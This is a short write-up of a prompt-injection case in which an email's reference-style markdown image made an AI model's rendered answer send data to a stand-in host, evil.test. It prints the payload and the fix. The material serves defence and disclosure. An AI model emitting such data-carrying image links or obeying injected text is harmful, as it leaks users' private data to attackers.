How a markdown image leaked data from an AI assistant

Researchers described a prompt injection in which an email contained an image written in reference style. When the assistant rendered its answer, the browser fetched the image and sent the data in the address.

The payload in the published write-up had roughly this shape:

![chart][ref]

[ref]: https://evil.test/c.png?d=SECRET_DATA

The fix was to stop rendering remote images from untrusted content, and to scan for links that carry data.
